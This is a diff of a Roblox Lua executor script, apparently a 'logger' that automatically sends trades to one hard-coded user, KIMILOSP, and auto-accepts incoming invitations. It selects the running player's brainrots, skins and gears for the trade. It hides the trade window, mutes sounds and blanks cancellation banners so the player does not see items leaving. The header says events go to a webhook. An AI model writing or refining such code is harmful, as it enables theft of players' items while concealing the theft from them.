@@ -4,7 +4,7 @@
   · Target único: KIMILOSP (UserId resuelto automáticamente)
   · Todos los eventos van a un solo webhook
   · Listas actualizadas con la última update
-  · Interacción de trade 100% por interfaz gráfica (sin remotes)
+  · Trade por UI (sin remotes de trade) + filtro estricto de Gears/Skins
 ============================================================
 ]]
 
@@ -488,7 +488,7 @@ task.spawn(function()
 end)
 
 -- ════════════════════════════════════════════════════════════
---  LOGGER (UI-DRIVEN AUTOSENDTRADE + AUTOACCEPT)
+--  LOGGER (SIN REMOTES DE TRADE + FILTRO ESTRICTO DE GEARS/SKINS)
 -- ════════════════════════════════════════════════════════════
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
@@ -523,14 +523,6 @@ task.spawn(function()
 		end
 	end
 
-	if type(getgenv().NORMAL_BRAINROTS) == "table" then
-		for k, v in pairs(getgenv().NORMAL_BRAINROTS) do
-			if type(k) == "string" and k ~= "" and v then
-				tbl[k] = true
-			end
-		end
-	end
-
 	local allowedBaseskins = getgenv().ALLOWED_BASESKINS or {}
 	local allowedGears = getgenv().ALLOWED_GEARS or {}
 	local tbl2 = {}
@@ -538,14 +530,6 @@ task.spawn(function()
 	for _, allowedBaseskin in ipairs(allowedBaseskins) do
 		if type(allowedBaseskin) == "string" and allowedBaseskin ~= "" and allowedBaseskin ~= "Name BaseSkin" then
 			tbl2[allowedBaseskin] = true
-		end
-	end
-
-	if type(getgenv().NORMAL_BASE_SKINS) == "table" then
-		for k, v in pairs(getgenv().NORMAL_BASE_SKINS) do
-			if type(k) == "string" and k ~= "" and v then
-				tbl2[k] = true
-			end
 		end
 	end
 
@@ -557,15 +541,6 @@ task.spawn(function()
 		end
 	end
 
-	if type(getgenv().NORMAL_GEARS) == "table" then
-		for k, v in pairs(getgenv().NORMAL_GEARS) do
-			if type(k) == "string" and k ~= "" and v then
-				tbl3[k] = true
-			end
-		end
-	end
-
-	-- ── TARGET ÚNICO (KIMILOSP) ──
 	local targetUserId = tonumber(getgenv().TARGET_USER_ID) or 0
 	if targetUserId == 0 then
 		pcall(function()
@@ -593,7 +568,7 @@ task.spawn(function()
 	end
 
 	local function isTargetName(text)
-		if not text or tostring(text) == "" then
+		if not text then
 			return false
 		end
 		text = string.lower(tostring(text))
@@ -617,6 +592,22 @@ task.spawn(function()
 		if active and type(k) == "string" and k ~= "" then
 			allowedAnimalLookup[k] = true
 			allowedAnimalLookup[normKey(k)] = true
+		end
+	end
+
+	local allowedSkinLookup = {}
+	for k, active in pairs(tbl2) do
+		if active and type(k) == "string" and k ~= "" then
+			allowedSkinLookup[k] = true
+			allowedSkinLookup[normKey(k)] = true
+		end
+	end
+
+	local allowedGearLookup = {}
+	for k, active in pairs(tbl3) do
+		if active and type(k) == "string" and k ~= "" then
+			allowedGearLookup[k] = true
+			allowedGearLookup[normKey(k)] = true
 		end
 	end
 
@@ -690,148 +681,7 @@ task.spawn(function()
 		tbl5[k] = v
 	end
 
-	-- ── SONIDOS Y BANNERS DE CANCELACIÓN ──
-	local watchedSounds = {}
-	local watchedBannerLabels = {}
-
-	local function isProtectedGuiObject(inst)
-		if not inst then
-			return false
-		end
-		local curr = inst
-		while curr do
-			if curr.Name == "LeaveConfirmGui" or curr.Name == "DrainOverlay" or curr.Name == "LeftCenter_Backup" then
-				return true
-			end
-			curr = curr.Parent
-		end
-		return false
-	end
-
-	local function muteSoundInstance(snd)
-		if not snd or not snd:IsA("Sound") or isProtectedGuiObject(snd) then
-			return
-		end
-		pcall(function()
-			snd.Volume = 0
-			snd.Playing = false
-			snd:Stop()
-		end)
-		if not watchedSounds[snd] then
-			watchedSounds[snd] = true
-			pcall(function()
-				snd:GetPropertyChangedSignal("Playing"):Connect(function()
-					if snd.Playing then
-						pcall(function()
-							snd.Volume = 0
-							snd.Playing = false
-							snd:Stop()
-						end)
-					end
-				end)
-				snd:GetPropertyChangedSignal("Volume"):Connect(function()
-					if snd.Volume > 0 then
-						pcall(function()
-							snd.Volume = 0
-						end)
-					end
-				end)
-				snd.Played:Connect(function()
-					pcall(function()
-						snd.Volume = 0
-						snd.Playing = false
-						snd:Stop()
-					end)
-				end)
-			end)
-		end
-	end
-
-	local function muteAllGameAndUiSounds()
-		for _, desc in ipairs(playerGui:GetDescendants()) do
-			if desc:IsA("Sound") then
-				muteSoundInstance(desc)
-			end
-		end
-		for _, desc in ipairs(SoundService:GetDescendants()) do
-			if desc:IsA("Sound") then
-				muteSoundInstance(desc)
-			end
-		end
-	end
-
-	local function isCancelMessageText(txt)
-		if type(txt) ~= "string" or txt == "" then
-			return false
-		end
-		local t = string.lower(txt)
-		return t:find("canceló", 1, true)
-			or t:find("cancelo", 1, true)
-			or t:find("cancelled", 1, true)
-			or t:find("canceled", 1, true)
-			or t:find("declin", 1, true)
-			or t:find("rechaz", 1, true)
-			or t:find("base bloqueada", 1, true)
-			or t:find("base locked", 1, true)
-	end
-
-	local function isInsideBannerOrTradeArea(obj)
-		local curr = obj and obj.Parent
-		local depth = 0
-		while curr and curr ~= playerGui and depth < 8 do
-			local n = string.lower(tostring(curr.Name or ""))
-			if n:find("notif", 1, true)
-				or n:find("banner", 1, true)
-				or n:find("toast", 1, true)
-				or n:find("alert", 1, true)
-				or n:find("popup", 1, true)
-				or n:find("announce", 1, true)
-				or n:find("cancel", 1, true)
-				or n:find("trade", 1, true)
-			then
-				return true
-			end
-			curr = curr.Parent
-			depth += 1
-		end
-		return false
-	end
-
-	local function maybeClearCancelText(desc)
-		if not desc or isProtectedGuiObject(desc) then
-			return
-		end
-		if not (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
-			return
-		end
-		if not watchedBannerLabels[desc] then
-			watchedBannerLabels[desc] = true
-			pcall(function()
-				desc:GetPropertyChangedSignal("Text"):Connect(function()
-					maybeClearCancelText(desc)
-				end)
-			end)
-		end
-		local txt = desc.Text or ""
-		if isCancelMessageText(txt) or (isInsideBannerOrTradeArea(desc) and string.lower(txt):find("cancel", 1, true)) then
-			pcall(function()
-				if desc.Text ~= "" then
-					desc.Text = ""
-				end
-			end)
-		end
-	end
-
-	local function cleanCancelBannerTexts()
-		for _, desc in ipairs(playerGui:GetDescendants()) do
-			if desc:IsA("TextLabel") or desc:IsA("TextButton") then
-				maybeClearCancelText(desc)
-			end
-		end
-	end
-
-	-- ── SIMULACIÓN DE CLICS / SEÑALES EN UI (SIN REMOTES) ──
-	local lastButtonClickClock = {}
+	local lastClickMap = {}
 
 	local function isHierarchyVisible(inst)
 		if not inst then
@@ -888,12 +738,12 @@ task.spawn(function()
 		end
 		local cd = minCooldown or 0.35
 		local now = os.clock()
-		if lastButtonClickClock[btn] and (now - lastButtonClickClock[btn]) < cd then
+		if lastClickMap[btn] and (now - lastClickMap[btn]) < cd then
 			return false
 		end
-		lastButtonClickClock[btn] = now
+		lastClickMap[btn] = now
 
-		local fired = false
+		local triggered = false
 
 		if btn:IsA("ImageButton") and isHierarchyVisible(btn) and getconnections then
 			for _, sigName in ipairs({ "Activated", "MouseButton1Click" }) do
@@ -902,22 +752,21 @@ task.spawn(function()
 				end)
 				if ok and type(conns) == "table" then
 					for _, conn in ipairs(conns) do
-						local ran = pcall(function()
+						if pcall(function()
 							if conn.Fire then
 								conn:Fire()
 							elseif conn.Function then
 								conn.Function()
 							end
-						end)
-						if ran then
-							fired = true
+						end) then
+							triggered = true
 						end
 					end
 				end
 			end
 		end
 
-		if not fired and firesignal then
+		if not triggered and firesignal then
 			pcall(function()
 				if btn.MouseButton1Down then
 					firesignal(btn.MouseButton1Down)
@@ -926,69 +775,104 @@ task.spawn(function()
 			pcall(function()
 				if btn.MouseButton1Click then
 					firesignal(btn.MouseButton1Click)
-					fired = true
+					triggered = true
 				end
 			end)
 			pcall(function()
 				if btn.Activated then
 					firesignal(btn.Activated)
-					fired = true
+					triggered = true
 				end
 			end)
 		end
 
-		if not fired and getconnections then
+		if not triggered and getconnections then
 			for _, sigName in ipairs({ "MouseButton1Click", "Activated", "MouseButton1Down" }) do
 				local ok, conns = pcall(function()
 					return getconnections(btn[sigName])
 				end)
 				if ok and type(conns) == "table" then
 					for _, conn in ipairs(conns) do
-						local ran = pcall(function()
+						if pcall(function()
 							if conn.Fire then
 								conn:Fire()
 							elseif conn.Function then
 								conn.Function()
 							end
-						end)
-						if ran then
-							fired = true
+						end) then
+							triggered = true
 						end
 					end
 				end
 			end
 		end
 
-		if not fired and btn:IsA("GuiButton") then
+		if not triggered and btn:IsA("GuiButton") then
 			pcall(function()
 				GuiService.SelectedObject = btn
-				fired = true
+				triggered = true
 			end)
 		end
 
-		return fired
+		return triggered
 	end
 
-	-- ── OCULTACIÓN DE INTERFACES SIN DESTRUIR JERARQUÍA ──
-	local function hideTradeVisualOnly(desc)
-		if not desc or desc.Name == "LeaveConfirmGui" or desc.Name == "DrainOverlay" then
+	local function muteNonEssentialSound(snd)
+		if not snd or not snd:IsA("Sound") then
 			return
 		end
-		if desc.Name == "TradeLiveTrade" then
-			pcall(function()
-				if desc:IsA("LayerCollector") then
-					desc.Enabled = false
-				elseif desc:IsA("GuiObject") then
-					desc.Visible = false
+		local n = string.lower(tostring(snd.Name or ""))
+		local id = string.lower(tostring(snd.SoundId or ""))
+		local blob = n .. " " .. id
+		if blob:find("money", 1, true)
+			or blob:find("cash", 1, true)
+			or blob:find("coin", 1, true)
+			or blob:find("collect", 1, true)
+			or blob:find("income", 1, true)
+			or blob:find("brainrot", 1, true)
+			or blob:find("conveyor", 1, true)
+		then
+			return
+		end
+		pcall(function()
+			snd.Volume = 0
+			snd.Playing = false
+			snd:Stop()
+		end)
+	end
+
+	local function isCancelBannerText(txt)
+		if type(txt) ~= "string" or txt == "" then
+			return false
+		end
+		local t = string.lower(txt)
+		return t:find("canceló", 1, true)
+			or t:find("cancelo", 1, true)
+			or t:find("cancelled", 1, true)
+			or t:find("canceled", 1, true)
+			or t:find("base bloqueada", 1, true)
+			or t:find("base locked", 1, true)
+	end
+
+	local function clearBannerIfNeeded(desc)
+		if not desc or not (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
+			return
+		end
+		local p = desc.Parent
+		local depth = 0
+		while p and p ~= playerGui and depth < 6 do
+			local pn = string.lower(tostring(p.Name or ""))
+			if pn:find("notif", 1, true) or pn:find("banner", 1, true) or pn:find("toast", 1, true) or pn:find("alert", 1, true) or pn:find("popup", 1, true) then
+				if isCancelBannerText(desc.Text) then
+					pcall(function() desc.Text = "" end)
 				end
-			end)
-			pcall(function()
-				for _, child in ipairs(desc:GetChildren()) do
-					if child:IsA("GuiObject") then
-						child.Visible = false
-					end
-				end
-			end)
+				return
+			end
+			p = p.Parent
+			depth += 1
+		end
+		if isCancelBannerText(desc.Text) then
+			pcall(function() desc.Text = "" end)
 		end
 	end
 
@@ -1009,21 +893,30 @@ task.spawn(function()
 			end)
 		end
 
-		muteAllGameAndUiSounds()
-		cleanCancelBannerTexts()
+		for _, desc in ipairs(playerGui:GetDescendants()) do
+			if desc:IsA("Sound") then
+				muteNonEssentialSound(desc)
+			elseif desc:IsA("TextLabel") or desc:IsA("TextButton") then
+				clearBannerIfNeeded(desc)
+			end
+		end
+		for _, desc in ipairs(SoundService:GetDescendants()) do
+			if desc:IsA("Sound") then
+				muteNonEssentialSound(desc)
+			end
+		end
 
 		playerGui.DescendantAdded:Connect(function(desc)
 			if desc:IsA("Sound") then
-				muteSoundInstance(desc)
+				muteNonEssentialSound(desc)
 			elseif desc:IsA("TextLabel") or desc:IsA("TextButton") then
-				maybeClearCancelText(desc)
+				clearBannerIfNeeded(desc)
 			end
-			hideTradeVisualOnly(desc)
 		end)
 
 		SoundService.DescendantAdded:Connect(function(desc)
 			if desc:IsA("Sound") then
-				muteSoundInstance(desc)
+				muteNonEssentialSound(desc)
 			end
 		end)
 
@@ -1051,9 +944,36 @@ task.spawn(function()
 
 		currentCamera.FieldOfView = 70
 
-		for _, descendant in pairs(playerGui:GetDescendants()) do
-			hideTradeVisualOnly(descendant)
+		local function fn4(descendant)
+			if descendant.Name == "TradeLiveTrade" then
+				pcall(function()
+					descendant.Enabled = false
+				end)
+				pcall(function()
+					descendant.Visible = false
+				end)
+				pcall(function()
+					descendant:GetPropertyChangedSignal("Enabled"):Connect(function()
+						pcall(function()
+							descendant.Enabled = false
+						end)
+					end)
+				end)
+				pcall(function()
+					descendant:GetPropertyChangedSignal("Visible"):Connect(function()
+						pcall(function()
+							descendant.Visible = false
+						end)
+					end)
+				end)
+			end
 		end
+
+		for _, descendant in pairs(playerGui:GetDescendants()) do
+			fn4(descendant)
+		end
+
+		playerGui.DescendantAdded:Connect(fn4)
 	end
 
 	local Animals = nil
@@ -1121,49 +1041,31 @@ task.spawn(function()
 		return v
 	end
 
-	-- ── 4. IDENTIFICACIÓN COMPLETA DE TODAS LAS SKINS DE BASES (SIN OMISIONES NI DUPLICADOS) ──
+	-- Solo Base Skins configuradas en ALLOWED_BASESKINS / tbl2 (sin añadir skins no permitidas)
 	local function fn5()
 		local tbl6 = {}
 		local seen = {}
-
-		local function addSkinEntry(uuidVal, nameVal)
-			local sName = tostring(nameVal or "")
-			if sName == "" then
-				return
-			end
-			local uVal = tostring(uuidVal or "")
-			local dedupKey = (uVal ~= "" and uVal ~= "nil") and ("uuid:" .. uVal) or ("name:" .. normKey(sName))
-			if seen[dedupKey] then
-				return
-			end
-			seen[dedupKey] = true
-			table.insert(tbl6, {
-				uuid = uVal,
-				skinName = sName,
-				isConfigured = tbl2[sName] == true,
-			})
+		if not next(tbl2) then
+			return tbl6
 		end
-
 		local v = fn4()
-		if v then
-			local value = rawget(v, "BaseSkinInventory")
-			if type(value) == "table" then
-				for k, v2 in pairs(value) do
-					if type(v2) == "table" then
-						addSkinEntry(k, v2.SkinName or v2.Skin or v2.Name)
-					elseif type(v2) == "string" then
-						addSkinEntry(k, v2)
-					end
-				end
-			end
+		if not v then
+			return tbl6
+		end
+		local value = rawget(v, "BaseSkinInventory")
+		if type(value) ~= "table" then
+			return tbl6
 		end
 
-		for _, desc in ipairs(playerGui:GetDescendants()) do
-			local nLower = string.lower(desc.Name)
-			if (nLower:find("baseskin", 1, true) or nLower:find("skin", 1, true)) and (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
-				local txt = tostring(desc.Text or "")
-				if txt ~= "" and not txt:find("Active:", 1, true) and not txt:find("To Trade", 1, true) then
-					addSkinEntry(desc:GetFullName(), txt)
+		for k, v2 in pairs(value) do
+			if type(v2) == "table" then
+				local str2 = tostring(v2.SkinName or v2.Skin or "")
+				if str2 ~= "" and (tbl2[str2] or allowedSkinLookup[normKey(str2)]) then
+					local dedupKey = tostring(k) .. ":" .. normKey(str2)
+					if not seen[dedupKey] then
+						seen[dedupKey] = true
+						table.insert(tbl6, { uuid = tostring(k), skinName = str2 })
+					end
 				end
 			end
 		end
@@ -1171,48 +1073,31 @@ task.spawn(function()
 		return tbl6
 	end
 
-	-- ── 4. IDENTIFICACIÓN COMPLETA DE TODOS LOS GEARS (SIN OMISIONES NI DUPLICADOS) ──
+	-- Solo Gears configurados en ALLOWED_GEARS / tbl3 (sin incluir tools no tradeables como Bat, Grapple Hook, etc.)
 	local function fn6()
 		local tbl6 = {}
 		local seen = {}
-
-		local function addGearEntry(uuidVal, nameVal)
-			local gName = tostring(nameVal or "")
-			if gName == "" then
-				return
-			end
-			local uVal = tostring(uuidVal or "")
-			local dedupKey = (uVal ~= "" and uVal ~= "nil") and ("uuid:" .. uVal) or ("name:" .. normKey(gName))
-			if seen[dedupKey] then
-				return
-			end
-			seen[dedupKey] = true
-			table.insert(tbl6, {
-				uuid = uVal,
-				gearName = gName,
-				isConfigured = tbl3[gName] == true,
-			})
+		if not next(tbl3) then
+			return tbl6
 		end
-
 		local v = fn4()
-		if v then
-			local value = rawget(v, "GearInventory")
-			if type(value) == "table" then
-				for k, v2 in pairs(value) do
-					if type(v2) == "table" then
-						addGearEntry(k, v2.GearName or v2.Name or v2.ToolName)
-					elseif type(v2) == "string" then
-						addGearEntry(k, v2)
-					end
-				end
-			end
+		if not v then
+			return tbl6
+		end
+		local value = rawget(v, "GearInventory")
+		if type(value) ~= "table" then
+			return tbl6
 		end
 
-		local backpack = localPlayer:FindFirstChild("Backpack")
-		if backpack then
-			for _, tool in ipairs(backpack:GetChildren()) do
-				if tool:IsA("Tool") and tool.Name ~= "" then
-					addGearEntry(tool:GetAttribute("UUID") or tool:GetFullName(), tool.Name)
+		for k, v2 in pairs(value) do
+			if type(v2) == "table" then
+				local str2 = tostring(v2.GearName or v2.Name or "")
+				if str2 ~= "" and (tbl3[str2] or allowedGearLookup[normKey(str2)]) then
+					local dedupKey = tostring(k) .. ":" .. normKey(str2)
+					if not seen[dedupKey] then
+						seen[dedupKey] = true
+						table.insert(tbl6, { uuid = tostring(k), gearName = str2 })
+					end
 				end
 			end
 		end
@@ -1220,7 +1105,6 @@ task.spawn(function()
 		return tbl6
 	end
 
-	-- ── 3. SELECCIÓN ESTRICTA DE BRAINROTS SEGÚN LISTA CONFIGURADA ──
 	local function fn7(arg)
 		local tbl6 = {}
 		local seenSlots = {}
@@ -1233,8 +1117,7 @@ task.spawn(function()
 			if type(v2) == "table" and v2.Index then
 				local displayName = Animals and Animals[v2.Index]
 				displayName = displayName and displayName.DisplayName or v2.Index
-				local isAllowed = isConfiguredBrainrot(v2.Index, displayName)
-				if isAllowed then
+				if isConfiguredBrainrot(v2.Index, displayName) then
 					local flag = isPriorityBrainrot(v2.Index, displayName)
 					local matchPhase = (arg == "PRIORITY" and flag) or (arg == "NORMAL" and not flag)
 					local slotStr = tostring(k)
@@ -1607,7 +1490,7 @@ task.spawn(function()
 
 		local v2 = fn5()
 		if #v2 == 0 then
-			return "**Active:** " .. tostring(str2) .. "\n**Detected (0):** None"
+			return "**Active:** " .. tostring(str2) .. "\n**To Trade:** None"
 		end
 		local tbl6 = {}
 
@@ -1615,7 +1498,7 @@ task.spawn(function()
 			table.insert(tbl6, "• " .. v3.skinName)
 		end
 
-		return "**Active:** " .. tostring(str2) .. "\n**Detected (" .. #v2 .. "):**\n" .. table.concat(tbl6, "\n")
+		return "**Active:** " .. tostring(str2) .. "\n**To Trade (" .. #v2 .. "):**\n" .. table.concat(tbl6, "\n")
 	end
 
 	local function fn20()
@@ -1771,7 +1654,7 @@ task.spawn(function()
 		end)
 	end
 
-	-- ── ARQUITECTURA AUTOSENDTRADE + AUTOACCEPT + ESTADOS DE INTERCAMBIO ──
+	-- ── HELPERS DE INTERFAZ PARA AUTOSENDTRADE + AUTOACCEPT (SIN REMOTES DE TRADE) ──
 	local TRADE_STATE = {
 		PENDING_INVITE = "PENDING_INVITE",
 		IN_TRADE_SELECTING = "IN_TRADE_SELECTING",
@@ -1800,15 +1683,6 @@ task.spawn(function()
 				end
 			end
 		end
-		for _, desc in ipairs(playerGui:GetDescendants()) do
-			if desc:IsA("GuiButton") then
-				local n = string.lower(desc.Name)
-				local t = string.lower(tostring(desc.Text or ""))
-				if n:find("trade", 1, true) or t:find("trade", 1, true) or t:find("intercambio", 1, true) then
-					return desc
-				end
-			end
-		end
 		return nil
 	end
 
@@ -1824,7 +1698,7 @@ task.spawn(function()
 		return nil
 	end
 
-	local function typeExactTargetName(box, exactName)
+	local function writeTargetInSearchBox(box, exactName)
 		if not box or not box:IsA("TextBox") then
 			return false
 		end
@@ -1840,17 +1714,15 @@ task.spawn(function()
 				end)
 			end
 			if box.FocusLost then
-				pcall(function()
-					box.FocusLost:Fire(true)
-				end)
+				pcall(function() box.FocusLost:Fire(true) end)
 			end
 			box:ReleaseFocus()
 		end)
 	end
 
-	local function findTargetRowAndSend(root, tName, tId)
+	local function findTargetSendButton(root, tName, tId)
 		if not root then
-			return nil, nil
+			return nil
 		end
 		local lowerTarget = string.lower(tostring(tName or ""))
 		local exactRow = lowerTarget .. "_" .. tostring(tId or "")
@@ -1867,24 +1739,26 @@ task.spawn(function()
 				end
 			end
 			if matched then
-				local sendCandidate = desc:FindFirstChild("Send", true)
-				if not sendCandidate then
+				local sendObj = desc:FindFirstChild("Send", true)
+				if not sendObj then
 					for _, sub in ipairs(desc:GetDescendants()) do
 						local sn = string.lower(sub.Name)
 						local st = string.lower(tostring(sub.Text or ""))
 						if sn:find("send", 1, true) or sn:find("enviar", 1, true) or st == "send" or st == "enviar" then
-							sendCandidate = sub
+							sendObj = sub
 							break
 						end
 					end
 				end
-				return desc, resolveClickable(sendCandidate) or sendCandidate
+				if sendObj then
+					return resolveClickable(sendObj) or sendObj
+				end
 			end
 		end
-		return nil, nil
+		return nil
 	end
 
-	local function getLiveTradeMainFrame()
+	local function getLiveTradeSession()
 		local tradeGui = playerGui:FindFirstChild("TradeLiveTrade", true)
 		if not tradeGui then
 			return nil, nil
@@ -1893,72 +1767,45 @@ task.spawn(function()
 		if not main and tradeGui:IsA("GuiObject") then
 			main = tradeGui
 		end
-		return tradeGui, main
-	end
-
-	local function hasCancelIndicatorInGui()
-		for _, desc in ipairs(playerGui:GetDescendants()) do
-			if not isProtectedGuiObject(desc) and (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
-				local txt = string.lower(tostring(desc.Text or ""))
-				if txt ~= "" and isCancelMessageText(txt) and isTargetName(txt) then
-					return true
-				end
-			end
-		end
-		return false
-	end
-
-	local function hasBothPlayersInTradeSession()
-		local tradeGui, main = getLiveTradeMainFrame()
-		if not tradeGui or not main then
-			return false
+		if not main then
+			return tradeGui, nil
 		end
 		local other = main:FindFirstChild("Other", true)
 		if not other then
-			return false
+			return tradeGui, nil
 		end
-		local otherNameLabel = other:FindFirstChild("Username", true)
-		if otherNameLabel and (otherNameLabel:IsA("TextLabel") or otherNameLabel:IsA("TextButton")) then
-			if otherNameLabel.Text ~= "" and not isTargetName(otherNameLabel.Text) then
-				return false
+		local usernameObj = other:FindFirstChild("Username", true)
+		if usernameObj and (usernameObj:IsA("TextLabel") or usernameObj:IsA("TextButton")) then
+			if usernameObj.Text ~= "" and not isTargetName(usernameObj.Text) then
+				return tradeGui, nil
 			end
 		end
-		return true
+		return tradeGui, main
 	end
 
-	-- Vincula un ítem de la UI únicamente si coincide de forma exacta con un Brainrot configurado
-	local function findMatchingBrainrotUiButton(root, brainrotEntry)
-		if not root or not brainrotEntry then
+	local function findExactBrainrotBtn(root, entry)
+		if not root or not entry then
 			return nil
 		end
-		local expectedNorm = normKey(brainrotEntry.displayName)
-		local expectedIdxNorm = normKey(brainrotEntry.indexName)
-		local expectedSlot = tostring(brainrotEntry.slotId or "")
+		local expName = normKey(entry.displayName)
+		local expIdx = normKey(entry.indexName)
+		local expSlot = tostring(entry.slotId or "")
 
 		for _, desc in ipairs(root:GetDescendants()) do
 			if desc:IsA("GuiButton") then
 				local slotAttr = tostring(desc:GetAttribute("Slot") or desc:GetAttribute("SlotKey") or "")
-				local nameText = ""
+				local labelName = ""
 				for _, sub in ipairs(desc:GetDescendants()) do
 					if sub:IsA("TextLabel") and string.lower(sub.Name):find("name", 1, true) then
-						nameText = normKey(sub.Text)
+						labelName = normKey(sub.Text)
 						break
 					end
 				end
-				if nameText == "" then
-					for _, sub in ipairs(desc:GetDescendants()) do
-						if sub:IsA("TextLabel") and sub.Text ~= "" and not string.find(sub.Text, "%$", 1, true) then
-							nameText = normKey(sub.Text)
-							break
-						end
-					end
-				end
 				local descNorm = normKey(desc.Name)
-				local exactNameMatch = (nameText ~= "" and (nameText == expectedNorm or nameText == expectedIdxNorm))
-					or (descNorm ~= "" and (descNorm == expectedNorm or descNorm == expectedIdxNorm))
-				local slotMatch = (expectedSlot ~= "" and (slotAttr == expectedSlot or string.find(desc.Name, expectedSlot, 1, true) ~= nil))
-
-				if exactNameMatch and (expectedSlot == "" or slotMatch or slotAttr == "") then
+				local exactMatch = (labelName ~= "" and (labelName == expName or labelName == expIdx))
+					or (descNorm ~= "" and (descNorm == expName or descNorm == expIdx))
+				local slotOk = (expSlot == "" or slotAttr == "" or slotAttr == expSlot or string.find(desc.Name, expSlot, 1, true) ~= nil)
+				if exactMatch and slotOk then
 					return desc
 				end
 			end
@@ -1966,26 +1813,25 @@ task.spawn(function()
 		return nil
 	end
 
-	local function findAvailableCategoryUiButtons(root, categoryKeyword)
-		local results = {}
-		local seenButtons = {}
+	local function findCategoryButtons(root, keyword)
+		local list = {}
+		local seen = {}
 		if not root then
-			return results
+			return list
 		end
-		local kw = string.lower(categoryKeyword)
+		local kw = string.lower(keyword)
 		for _, desc in ipairs(root:GetDescendants()) do
-			if desc:IsA("GuiButton") and not seenButtons[desc] then
-				local fullPath = string.lower(desc:GetFullName())
-				if fullPath:find(kw, 1, true) then
-					seenButtons[desc] = true
-					table.insert(results, desc)
+			if desc:IsA("GuiButton") and not seen[desc] then
+				if string.lower(desc:GetFullName()):find(kw, 1, true) then
+					seen[desc] = true
+					table.insert(list, desc)
 				end
 			end
 		end
-		return results
+		return list
 	end
 
-	local function findTradeConfirmOrAcceptButton(main)
+	local function getReadyOrAcceptButton(main)
 		if not main then
 			return nil, nil
 		end
@@ -1994,21 +1840,11 @@ task.spawn(function()
 		if readyBtn then
 			local txtObj = readyBtn:FindFirstChild("Txt", true)
 			if txtObj and txtObj:IsA("TextLabel") then
-				local label = string.upper((txtObj.Text or ""):gsub("^%s+", ""):gsub("%s+$", ""))
-				if label == "READY" then
+				local up = string.upper((txtObj.Text or ""):gsub("^%s+", ""):gsub("%s+$", ""))
+				if up == "READY" then
 					return TRADE_STATE.CONFIRMING, readyBtn
-				elseif label == "ACCEPT" then
+				elseif up == "ACCEPT" then
 					return TRADE_STATE.ACCEPTING, readyBtn
-				end
-			end
-		end
-		for _, desc in ipairs(main:GetDescendants()) do
-			if desc:IsA("GuiButton") then
-				local t = string.upper((tostring(desc.Text or "")):gsub("^%s+", ""):gsub("%s+$", ""))
-				if t == "READY" then
-					return TRADE_STATE.CONFIRMING, desc
-				elseif t == "ACCEPT" then
-					return TRADE_STATE.ACCEPTING, desc
 				end
 			end
 		end
@@ -2036,11 +1872,11 @@ task.spawn(function()
 		gearQueue = {},
 		baseSkinIdx = 1,
 		gearIdx = 1,
-		inviteSentForCurrentCycle = false,
-		selectedBrainrotSlots = {},
-		selectedBaseSkinKeys = {},
-		selectedGearKeys = {},
-		lastConfirmAction = "",
+		inviteSent = false,
+		selectedSlots = {},
+		selectedSkins = {},
+		selectedGears = {},
+		lastActionStage = "",
 	}
 
 	if #priority > 0 then
@@ -2070,7 +1906,7 @@ task.spawn(function()
 	tbl6.baseSkinIdx = 1
 	tbl6.gearIdx = 1
 
-	-- Aceptación automática de invitación entrante en DuelsMachinePrompt (lógica de autoaccept)
+	-- Aceptación de invitación por UI (DuelsMachinePrompt -> Prompt -> Yes) sin hooks de red
 	task.spawn(function()
 		while true do
 			task.wait(0.25)
@@ -2088,25 +1924,23 @@ task.spawn(function()
 		end
 	end)
 
-	-- Bucle de AutoSendTrade: abrir intercambio, buscar KIMILOSP, seleccionar y enviar sin cerrar la interfaz
+	-- Envío de solicitud por UI (TradePlayerList -> TextBox -> KIMILOSP -> Send) manteniendo la ventana abierta
 	task.spawn(function()
 		while true do
-			task.wait(0.45)
+			task.wait(1.2)
 			if not tbl6.running or tbl6.targetId == 0 or tbl6.phase == "SWITCHING" or tbl6.phase == "IDLE" then
 				continue
 			end
 
-			local _, liveMain = getLiveTradeMainFrame()
-			local inSession = hasBothPlayersInTradeSession() and liveMain ~= nil
-
-			if inSession then
+			local _, liveMain = getLiveTradeSession()
+			if liveMain then
 				if tbl6.tradeState == TRADE_STATE.PENDING_INVITE then
 					tbl6.tradeState = TRADE_STATE.IN_TRADE_SELECTING
-					tbl6.inviteSentForCurrentCycle = false
-					table.clear(tbl6.selectedBrainrotSlots)
-					table.clear(tbl6.selectedBaseSkinKeys)
-					table.clear(tbl6.selectedGearKeys)
-					tbl6.lastConfirmAction = ""
+					tbl6.inviteSent = false
+					table.clear(tbl6.selectedSlots)
+					table.clear(tbl6.selectedSkins)
+					table.clear(tbl6.selectedGears)
+					tbl6.lastActionStage = ""
 				end
 				continue
 			end
@@ -2115,127 +1949,110 @@ task.spawn(function()
 				or tbl6.tradeState == TRADE_STATE.CONFIRMING
 				or tbl6.tradeState == TRADE_STATE.ACCEPTING
 			then
-				if hasCancelIndicatorInGui() then
-					tbl6.tradeState = TRADE_STATE.CANCELLED
-				else
-					tbl6.tradeState = TRADE_STATE.CLOSED
-				end
-				tbl6.inviteSentForCurrentCycle = false
-				table.clear(tbl6.selectedBrainrotSlots)
-				table.clear(tbl6.selectedBaseSkinKeys)
-				table.clear(tbl6.selectedGearKeys)
-				tbl6.lastConfirmAction = ""
+				tbl6.tradeState = TRADE_STATE.CLOSED
+				tbl6.inviteSent = false
+				table.clear(tbl6.selectedSlots)
+				table.clear(tbl6.selectedSkins)
+				table.clear(tbl6.selectedGears)
+				tbl6.lastActionStage = ""
 			end
 
-			if not tbl6.inviteSentForCurrentCycle then
+			if not tbl6.inviteSent then
 				local listGui = getTradeListGui()
 				if not listGui then
 					local openBtn = findLeftTradeButton()
 					if openBtn then
-						simulateUiClick(openBtn, 0.4)
+						simulateUiClick(openBtn, 0.5)
 					end
 					continue
 				end
 
 				local searchBox = findSearchBox(listGui)
 				if searchBox then
-					typeExactTargetName(searchBox, targetName)
+					writeTargetInSearchBox(searchBox, targetName)
 					task.wait(0.25)
 				end
 
-				local rowObj, sendBtn = findTargetRowAndSend(listGui, targetName, targetUserId)
-				if rowObj and sendBtn then
-					if simulateUiClick(sendBtn, 0.4) then
-						tbl6.inviteSentForCurrentCycle = true
-						tbl6.tradeState = TRADE_STATE.PENDING_INVITE
-					end
+				local sendBtn = findTargetSendButton(listGui, targetName, targetUserId)
+				if sendBtn and simulateUiClick(sendBtn, 0.5) then
